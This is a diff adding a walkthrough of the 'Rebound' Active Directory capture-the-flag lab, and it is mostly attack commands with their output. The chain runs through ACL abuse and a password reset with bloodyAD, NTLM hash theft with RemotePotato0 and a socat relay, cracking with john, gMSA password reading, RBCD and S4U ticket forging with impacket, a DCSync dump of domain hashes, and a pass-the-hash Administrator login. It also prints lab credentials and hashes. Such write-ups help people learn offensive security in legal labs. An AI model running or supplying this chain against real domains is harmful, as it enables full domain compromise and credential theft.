@@ -1,4 +1,4 @@
-##### Tags: `AD`  `AS-REP Roasting`  ``  ``  ``  ``  ``
+##### Tags: `AD`  `AS-REP Roasting`  `password spraying`  `bloodhound-python`  `bloodyAD`  `ntlm theft`  `rbcd` `PtH`
 
 # 🪟 Rebound (AD)🪟
 ## Enumeration
@@ -114,4 +114,160 @@ since we have vaild domain username and password
 use bloodhound python to obtain the data of active directory
 ```console
 $ bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc DC01.rebound.htb -c All -ns 10.129.232.31
+```
+## Attacking path  
+bloodhound shows the user oorend can add itself to ServiceMgmt Group  
+Service Mgmt Group has GenericAll over user winrm_svc  
+winrm_svc can remote login to the machine  
+  
+Add oorend to ServiceMgmt group
+```console
+$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember ServiceMGMT oorend
+[+] oorend added to ServiceMGMT
+```
+enable GenericAll privilege
+```console
+$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
+[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
+```
+change password of winrm_svc
+```console
+$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'Password123' 
+[+] Password changed successfully!
+```
+logged in as winrm_svc
+```console
+$ evil-winrm -i 10.129.232.31 -u 'winrm_svc' -p 'Password123'                                                                         
+                                        
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
+rebound\winrm_svc
+```
+## Lateral Movement
+there is another user tbrady on the machine
+```console
+*Evil-WinRM* PS C:\Users> ls
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        8/28/2023   8:23 PM                Administrator
+d-r---        7/20/2021  12:23 PM                Public
+d-----        8/22/2023  12:05 PM                tbrady
+d-----         4/8/2023   2:08 AM                winrm_svc
+```
+bloodhound show tbrady has ReadGMSAPassword over Group DELEGATOR$  
+when we run runascs.exe we can see tbrady is on this machine
+```console
+*Evil-WinRM* PS C:\temp> .\RunasCs.exe x x qwinsta -l 9
+
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+>services                                    0  Disc
+ console           tbrady                    1  Active
+```
+we set network relay
+```console
+#Attacker machine
+
+$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.232.31:9999
+```
+upload RemotePotato0.exe to steal the hash of tbrady
+```console
+# target machine
+
+*Evil-WinRM* PS C:\temp> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.16.156 -p 9999
+[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
+[*] Example Network redirector:
+        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
+[*] Starting the RPC server to capture the credentials hash from the user authentication!!
+[*] Spawning COM object in the session: 1
+[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+[*] RPC relay server listening on port 9997 ...
+[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
+[*] IStoragetrigger written: 106 bytes
+[*] ServerAlive2 RPC Call
+[*] ResolveOxid2 RPC call
+[+] Received the relayed authentication on the RPC relay server on port 9997
+[*] Connected to RPC Server 127.0.0.1 on port 9999
+[+] User hash stolen!
+
+NTLMv2 Client   : DC01
+NTLMv2 Username : rebound\tbrady
+NTLMv2 Hash     : tbrady::rebound:a23a72d30e54f146:bed234aadea628ce8d2b2073a6d3947d:0101000000000000216bcc64f228dd01a649d6975b5fb8ad0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800216bcc64f228dd010600040006000000080030003000000000000000010000000020000012e2fa4ab743c6c1185b696021c25f45ceaa4feda2a5454acd5600e127f69b010a00100000000000000000000000000000000000090000000000000000000000
+```
+cracked the hash and we got tbrady:543BOMBOMBUNmanda
+```console
+$ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt      
+
+543BOMBOMBUNmanda (tbrady)     
+Session completed. 
+```
+## Privilege Escalation
+use nxc to get the ntlm hash of delegator$
+```console
+$ nxc ldap 10.129.232.31 -u tbrady -p '543BOMBOMBUNmanda' -k --gmsa
+LDAP        10.129.232.31   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
+LDAPS       10.129.232.31   636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
+LDAPS       10.129.232.31   636    DC01             [*] Getting GMSA Passwords
+LDAPS       10.129.232.31   636    DC01             Account: delegator$           NTLM: 696b4aac5199179d5d20fb8755676777     PrincipalsAllowedToReadPassword: tbrady
+```
+from the account we owned, only ldap_monitor and delegator$ has SPN
+```console
+$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object oorend | grep servicePrincipalName 
+                                                                                                                                                        
+$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object ldap_monitor | grep servicePrincipalName
+servicePrincipalName: ldapmonitor/dc01.rebound.htb
+                                                                                                                                                        
+$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' | grep servicePrincipalName
+servicePrincipalName: browser/dc01.rebound.htb
+```
+use ldap_monitor to configures Resource-Based Constrained Delegation (RBCD) 
+```console
+$ impacket-rbcd 'rebound.htb/delegator$' -hashes :696b4aac5199179d5d20fb8755676777 -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip 10.129.232.31 -use-ldaps
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
+```
+Kerberos delegation attack
+```console
+$ impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating DC01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
+```
+chain or chain-request a Kerberos service ticket using Constrained Delegation based on an existing ticket cache
+```console
+$ impacket-getST -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :696b4aac5199179d5d20fb8755676777 -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating DC01$
+[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
+```
+dump the hashes using the ticket cache
+```console
+$ KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache' impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-ntlm   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
+```
+Pass the hash login as administrator 
+```console
+$ evil-winrm -i 10.129.232.31 -u 'administrator' -H '176be138594933bb67db3b2572fc91b8'
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+rebound\administrator
 ```
